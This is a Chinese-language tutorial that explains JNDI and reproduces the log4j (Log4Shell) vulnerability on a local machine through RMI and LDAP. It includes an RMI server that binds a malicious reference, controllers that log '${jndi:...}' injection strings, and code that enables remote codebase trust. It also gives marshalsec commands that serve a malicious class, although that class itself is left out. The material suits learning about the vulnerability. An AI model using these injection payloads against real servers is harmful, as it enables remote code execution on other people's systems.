⭐什么是JNDI#

  • JNDI，全名：Java Name Directory Interface，SUN公司提供的一种标准的Java命名系统接口

  • JNDI主要有两部分组成：应用程序编程接口【API】和服务供应商接口【SPI】。

    • 应用程序编程接口：提供了Java应用程序访问各种命名和目录服务的功能
    • 服务供应商接口：提供了任意一种服务的供应商使用的功能。

  • 例如tomcat服务：通过JNDI，服务商将tomcat中所有资源赋予一个唯一的标识，包括数据库，网页，文件，文件目录，连接池等等。开发人员通过该标识访问与管理服务中所有的资源。

  • 通俗点来说，sun公司定义了规范【即JNDI】，服务提供商通过JNDI规范创造服务，开发人员通过服务商提供的服务和JNDI规范创造应用。如果没有同一个标准，不同的服务商与开发人员，有着各种各样的标准，这学习成本，光记忆不同标准就需要花非常多时间，所以JNDI是非常必要的。

⭐其他服务#

  • RMI【JAVA远程方法调用】
  • LDAP【轻量级目录访问协议】
  • CORBA【公共对象请求代理体系结构】
  • DNS【域名服务】

⭐JNDI和不同服务#

  • JNDI的存在其实是为了协同其他应用来进行远程服务，它可以在客户端和服务端中都进行一些工作，其目的是为了将应用统一管理。
  • 所以log4j漏洞就是通过其他服务注入到本地服务的JNDI

⭐创建springboot工程#

  • 导入依赖，springboot好像默认使用slf4j+logback的方式来记录日志。所以需要去掉默认设置

  • <!--导入springboot，去掉默认日志-->
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-web</artifactId>
    <exclusions>
        <exclusion>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-logging</artifactId>
        </exclusion>
    </exclusions>
</dependency>
<!--加入log4j-->
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-log4j2</artifactId>
    <version>2.1.4.RELEASE</version>
</dependency>

⭐JNDI与RMI复现log4j漏洞#

  • 启动一个JNDI服务并绑定一个恶意类【恶意类实现不提供了，大体上是让本地服务弹出计算器】

    • public class RmiServer {
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        //启动一个JNDI服务
        Registry registry = LocateRegistry.createRegistry(1099);

        //创建一个恶意资源，注意参数className，factory的前缀，前缀代表了包的结构
        Reference reference = new Reference("***", "***", "http://127.0.0.1:8081/");
        ReferenceWrapper refObjWrapper = new ReferenceWrapper(reference);

        //给资源命名，并绑定
        registry.bind("remote", refObjWrapper);

        System.out.println("攻击资源已经绑定到JNDI...'");
    }
}

  • 自定义一个Restful风格的方法，方法中创建log4j对象并调用记录日志的方法，其实是模拟了服务器记录平常的日志信息

    • 【注意：高本版JDK默认不允许从远程的Codebase加载Reference工厂类，需要手动开启】

    • @Controller
@RequestMapping("/Rmi")
public class Rmi {
    private static final Logger logger = LogManager.getLogger(Rmi.class);
    @GetMapping
    public void login() {
        System.out.println("记录登录日志");

        //The object factory is untrusted. Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'.
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");

        //JNDI注入，模拟用户恶意请求
        logger.error("${jndi:rmi://你的IP/remote}");
    }
}

  • log4j执行原理网上有很多分析了，大概原理如下

    • @Test
public void Jndi(){
    //log4j包含了这个执行顺序，所有只需要修改lookup的uri参数就能注入JNDI
    try {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        String uri = "rmi://你的IP/remote";
        Context ctx = new InitialContext();
        Object lookup = ctx.lookup(uri);
        System.out.println(lookup);
    }catch (Exception e){
        e.printStackTrace();
    }
}

    • 可以看到请求的是本地服务，然后本地服务执行的代码应该是记录日志才对，但是却执行了远端的代码，而远端代码成功让本地服务弹出了电脑的计算器

⭐JNDI与LDAP复现log4j漏洞#

  • 还是老样子，在本地构建一个远端服务，该服务包含了ldap协议
✅从github下工具包#
  • 随便找个文件夹克隆git仓库
    • git clone git@github.com:mbechler/marshalsec.git
  • 保持路径不变，使用命令打开文件夹
    • cd marshalsec
  • 进入文件夹后，使用maven命令打包，前提是电脑已经安装与配置过maven工具
    • mvn clean package -DskipTests
  • 打包成功后，在文件夹中找到以下两个压缩包，后面需要这两个jar包创建一个包含ldap的服务
    • marshalsec-0.0.3-SNAPSHOT
    • marshalsec-0.0.3-SNAPSHOT-all
✅创建ldap服务#
  • 复制上面两个jar包到idea工程的随便一个文件夹
  • 在该文件夹下创建一个恶意类
    • 【注意：不能包含包名，不能有中文，不能直接别的地方复制【必须手写，好像idea也不允许复制class文件】】
  • 从终端打开该文件夹，编写最初的javac命令，将恶意类编译成class文件
    • javac Attack.java
  • 使用命令创建ldap服务并绑定恶意类
    • 注意：有的终端命令打印可能没有#号，执行的命令中必须包含#号
    • java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:1389/#Attack"
✅启动springboot并访问#

  • 与上面一样，创建并启动一个springboot，能用浏览器访问到log4j对象中记录日志的方法即可

    • 【也需要开启允许从远程的Codebase加载Reference工厂类】

    • @Controller
@RequestMapping("/LDAP")
public class LDAP {
    private static final Logger logger = LogManager.getLogger(LDAP.class);
    @GetMapping
    public void login() {
        System.setProperty("com.sun.jndi.Ldap.object.trustURLCodebase", "true");
        logger.error("params:{}","${jndi:ldap://127.0.0.1:1389/Attack}");
    }
}

  • 可以看到与上面一样，访问的还是本地的服务，本地服务也应该记录日志才对，但是一样执行了远端的代码，而远端代码同样成功让本地服务弹出了电脑的计算器

⭐小结#

  • 其实这个漏洞其实非常危险的，因为它能让服务器执行任意代码，而我们现实中很多东西实际上在服务器不就是一堆数据而已嘛
  • 不过大厂都有安全顾问，也有非常多的安全措施
  • 现在网络上已经有很多解决方案了，而且也有很多人在修复问题了
